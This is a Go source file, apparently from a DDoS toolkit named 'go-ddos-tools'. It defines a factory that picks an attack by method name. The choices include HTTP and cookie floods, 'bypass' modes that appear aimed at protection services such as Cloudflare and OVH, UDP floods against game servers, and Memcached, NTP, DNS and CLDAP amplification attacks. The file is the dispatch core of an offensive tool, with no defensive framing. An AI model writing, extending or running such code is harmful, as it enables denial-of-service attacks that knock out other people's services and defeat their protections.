package attacks

import (
	"github.com/go-ddos-tools/pkg/attacks/layer4"
	"github.com/go-ddos-tools/pkg/attacks/layer7"
	"github.com/go-ddos-tools/pkg/core"
	"github.com/go-ddos-tools/pkg/methods"
)

// NewAttacker creates a new Attacker based on the method name
func NewAttacker(method string, cfg *core.AttackConfig) core.Attacker {
	if methods.IsLayer7Method(method) {
		switch method {
		case "GET", "POST", "HEAD":
			return layer7.NewHTTPFlood(cfg, method)
		case "STRESS":
			return layer7.NewStressFlood(cfg)
		case "COOKIE":
			return layer7.NewCookieFlood(cfg)
		case "CFB", "BYPASS", "OVH", "DGB":
			return layer7.NewBypassAttack(cfg, method)
		case "XMLRPC", "APACHE":
			return layer7.NewAdvancedAttack(cfg, method)
		default:
			// Fallback to Raw for others or if generic
			return layer7.NewRawAttack(cfg, method)
		}
	} else if methods.IsLayer4Method(method) {
		switch method {
		case "UDP", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN", "MCPE", "OVH-UDP":
			return layer4.NewUDPAttack(cfg, method)
		case "MEM", "NTP", "DNS", "CHAR", "CLDAP", "ARD", "RDP":
			return layer4.NewAmplificationAttack(cfg, method)
		default:
			return layer4.NewTCPAttack(cfg, method)
		}
	}
	return nil
}
